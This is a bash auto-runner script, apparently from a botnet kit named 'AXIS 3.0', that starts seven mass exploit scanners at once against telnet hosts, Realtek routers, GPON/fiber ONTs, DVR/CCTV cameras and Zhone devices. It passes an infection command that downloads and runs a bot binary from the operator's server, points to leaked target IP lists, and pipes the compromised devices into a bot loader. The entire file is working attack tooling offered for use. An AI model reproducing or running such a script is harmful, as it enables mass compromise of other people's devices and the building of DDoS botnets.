#!/bin/bash

# ============================================================================
# AXIS 3.0 - Extra Scanners Auto-Runner
# Runs all 3 server-side scanners simultaneously to load bots
# ============================================================================

SERVER_IP="${1:-$(curl -s ifconfig.me)}"
THREADS="${2:-1000}"

echo "============================================================================"
echo "AXIS 3.0 Extra Scanners - Auto-Runner"
echo "============================================================================"
echo "Server IP: $SERVER_IP"
echo "Threads per scanner: $THREADS"
echo ""

# Create leaks directory structure if it doesn't exist
mkdir -p leaks
mkdir -p b4ckdoorarchive/RANDOM.LST

# Check if IP lists exist
if [ ! -f "leaks/10.lst" ]; then
    echo "[-] IP lists not found! Download from: https://github.com/illusionsec/DDOS-archive/tree/main/leaks"
    echo "    Place files in: leaks/"
    echo ""
    echo "Required files:"
    echo "  - leaks/10.lst (or any .lst file)"
    echo "  - leaks/CF-Rules-1.txt (or any CF Rules file)"
    echo "  - b4ckdoorarchive/RANDOM.LST/realtek.lst"
    exit 1
fi

# Find available IP list files
IP_LIST=$(ls leaks/*.lst 2>/dev/null | head -1)
CF_RULES=$(ls leaks/CF*.txt 2>/dev/null | head -1)
REALTEK_LIST="b4ckdoorarchive/RANDOM.LST/realtek.lst"

# Use defaults if specific files not found
[ -z "$IP_LIST" ] && IP_LIST=$(ls leaks/*.lst 2>/dev/null | head -1)
[ -z "$CF_RULES" ] && CF_RULES=$(ls leaks/*.txt 2>/dev/null | head -1)

echo "[*] Using IP lists:"
echo "    Telnet: $IP_LIST"
echo "    0-day:  $CF_RULES"
echo "    Realtek: $REALTEK_LIST"
echo "    Randox86: randox86-valid.txt"
echo "    Fiber: fiber-targets.txt (create or use existing)"
echo "    DVR: dvr-targets.txt (create or use existing)"
echo "    Zhone: zhone-targets.txt (create or use existing)"
echo ""
echo "[*] Starting all 7 scanners simultaneously..."
echo ""

# Start all 7 scanners in background
./extrascanners/telnet-scanner "$IP_LIST" "$THREADS" &
PID1=$!
echo "[+] Telnet Scanner started (PID: $PID1)"

./extrascanners/0day-exploit "$CF_RULES" "$SERVER_IP" "$THREADS" &
PID2=$!
echo "[+] 0-Day Exploit Scanner started (PID: $PID2)"

./extrascanners/realtek-loader "$REALTEK_LIST" "$SERVER_IP" "$THREADS" &
PID3=$!
echo "[+] Realtek Loader started (PID: $PID3)"

./extrascanners/randox86 "randox86-valid.txt" "wget http://$SERVER_IP/bins/axis.x86;chmod +x /tmp/a;/tmp/a" "$THREADS" &
PID4=$!
echo "[+] Randox86 Exploit Scanner started (PID: $PID4)"

./extrascanners/fiber "fiber-targets.txt" "$SERVER_IP" "$THREADS" &
PID5=$!
echo "[+] Fiber/GPON Exploit Scanner started (PID: $PID5)"

./extrascanners/dvr "dvr-targets.txt" "$SERVER_IP" "$THREADS" &
PID6=$!
echo "[+] DVR/CCTV Exploit Scanner started (PID: $PID6)"

./extrascanners/zhone "zhone-targets.txt" "$SERVER_IP" "$THREADS" &
PID7=$!
echo "[+] Zhone ONT/OLT Exploit Scanner started (PID: $PID7)"

echo ""
echo "[*] All scanners running simultaneously!"
echo "[*] Results will be saved to:"
echo "    - telnet_results.txt"
echo "    - 0day_results.txt"
echo "    - realtek_results.txt"
echo "    - randox86_results.txt"
echo "    - fiber_results.txt"
echo "    - dvr_results.txt"
echo "    - zhone_results.txt"
echo ""
echo "[*] Press Ctrl+C to stop all scanners"
echo ""

# Wait for all scanners to complete
wait $PID1 $PID2 $PID3 $PID4 $PID5 $PID6 $PID7

echo ""
echo "============================================================================"
echo "All Scanners Completed!"
echo "============================================================================"
echo ""
echo "Results:"
[ -f "telnet_results.txt" ] && echo "  - Telnet: $(wc -l < telnet_results.txt) successful logins"
[ -f "0day_results.txt" ] && echo "  - 0-Day:  $(wc -l < 0day_results.txt) exploited devices"
[ -f "realtek_results.txt" ] && echo "  - Realtek: $(wc -l < realtek_results.txt) compromised routers"
[ -f "randox86_results.txt" ] && echo "  - Randox86: $(wc -l < randox86_results.txt) exploited targets"
[ -f "fiber_results.txt" ] && echo "  - Fiber: $(wc -l < fiber_results.txt) exploited GPON/ONT routers"
[ -f "dvr_results.txt" ] && echo "  - DVR: $(wc -l < dvr_results.txt) exploited CCTV/DVR cameras"
[ -f "zhone_results.txt" ] && echo "  - Zhone: $(wc -l < zhone_results.txt) exploited ONT/OLT routers"
echo ""
echo "To feed results to loader:"
echo "  cat telnet_results.txt 0day_results.txt realtek_results.txt randox86_results.txt fiber_results.txt dvr_results.txt zhone_results.txt | ./loader"
echo ""
